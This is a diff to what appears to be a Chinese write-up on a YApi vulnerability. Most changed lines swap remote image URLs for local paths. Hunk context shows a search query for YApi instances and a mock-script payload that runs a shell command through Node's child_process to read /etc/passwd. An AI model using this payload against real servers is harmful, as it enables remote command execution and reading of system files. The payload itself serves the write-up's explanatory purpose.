@@ -20,7 +20,7 @@ app="YApi"
 
 登录页面
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202091829002.png)
+![](./images/202202091829002.png)
 
 
 
@@ -28,11 +28,11 @@ app="YApi"
 
 
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202091829520.png)
+![](./images/202202091829520.png)
 
 
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202091829602.png)
+![](./images/202202091829602.png)
 
 
 
@@ -55,7 +55,7 @@ mockJson = process.mainModule.require("child_process").execSync("cat /etc/passwd
 
 
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202091830184.png)
+![](./images/202202091830184.png)
 
 
 
@@ -63,4 +63,4 @@ mockJson = process.mainModule.require("child_process").execSync("cat /etc/passwd
 
 
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202091830086.png)
+![](./images/202202091830086.png)
